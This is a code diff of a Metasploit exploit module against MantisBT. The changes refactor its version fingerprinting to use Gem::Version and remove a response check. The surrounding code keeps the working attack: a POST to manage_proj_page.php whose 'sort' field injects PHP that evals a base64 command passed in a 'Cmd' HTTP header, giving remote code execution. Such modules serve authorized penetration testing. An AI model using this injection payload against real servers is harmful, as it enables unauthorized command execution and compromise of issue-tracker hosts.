@@ -57,18 +57,16 @@ class MetasploitModule < Msf::Exploit::Remote
       return CheckCode::Unknown
     end
 
-    unless res.body =~ /Mantis ([0-9]+).([0-9]+).([0-9]+)/
+    unless res.body =~ /Mantis ([0-9]+.[0-9]+.[0-9]+)/
       vprint_error('Cannot determine Mantis version!')
       return CheckCode::Unknown
     end
 
-    major = Regexp.last_match[1]
-    minor = Regexp.last_match[2]
-    rev = Regexp.last_match[3]
+    version = Gem::Version.new(Regexp.last_match[1])
 
-    vprint_status("Mantis version #{major}.#{minor}.#{rev} detected")
+    vprint_status("Mantis version #{version.to_s} detected")
 
-    unless res.code == 200 && (major.to_i > 1 || minor.to_i > 1 || (minor.to_i == 1 && rev.to_i > 3))
+    unless res.code == 200 && version > Gem::Version.new('1.1.3')
       return CheckCode::Appears
     end
 
@@ -113,7 +111,7 @@ class MetasploitModule < Msf::Exploit::Remote
     data = {
       'sort' => "']);}error_reporting(0);print(_code_);eval(base64_decode($_SERVER[HTTP_CMD]));die();#",
     }
-    res = send_request_cgi({
+    send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'manage_proj_page.php'),
       'method'    => 'POST',
       'vars_post' => data,
@@ -123,6 +121,5 @@ class MetasploitModule < Msf::Exploit::Remote
         'Cmd': payload_b64
       }
     })
-    fail_with(Failure::Unknown, 'Host disconnected during exploit!') unless res
   end
 end
